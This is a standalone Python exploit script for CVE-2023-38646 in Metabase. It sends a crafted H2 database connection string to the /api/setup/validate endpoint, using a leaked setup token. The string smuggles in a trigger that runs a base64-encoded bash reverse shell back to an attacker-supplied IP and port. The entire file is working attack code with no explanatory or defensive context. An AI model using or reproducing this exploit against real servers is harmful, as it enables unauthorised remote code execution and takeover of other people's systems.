import requests
import argparse
import base64

print("CVE-2023-38646\n")

# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", type=str, required=True, help="Target URL to test")
parser.add_argument("-t", "--token", type=str, required=True, help="Get the setup token. Found at /api/session/properties.")
parser.add_argument("-i", "--host_ip", type=str, required=True, help="IP of the host")
parser.add_argument("-p", "--host_port", type=str, required=True, help="Port of the host for reverse shell")
args = parser.parse_args()

# Construct the URL and headers for the POST request
url = args.url + "/api/setup/validate"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Connection": "close"
}

# Prepare the payload for the POST request
rev_shell = base64.b64encode(f"bash -i >& /dev/tcp/{args.host_ip}/{args.host_port} 0>&1".encode())
payload = {
    "details": {
        "details": {
            "advanced-options": True,
            "classname": "org.h2.Driver",
            "subname": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER eheheh BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,"+rev_shell.decode("utf-8")+"}|{base64,-d}|{bash,-i}')\n$$--=x",
            "subprotocol": "h2"
        },
        "engine": "postgres",
        "name": "x"
    },
    "token": args.token
}

# Send the POST request
response = requests.post(url, headers=headers, json=payload)

# Display completed
print("Completed.")
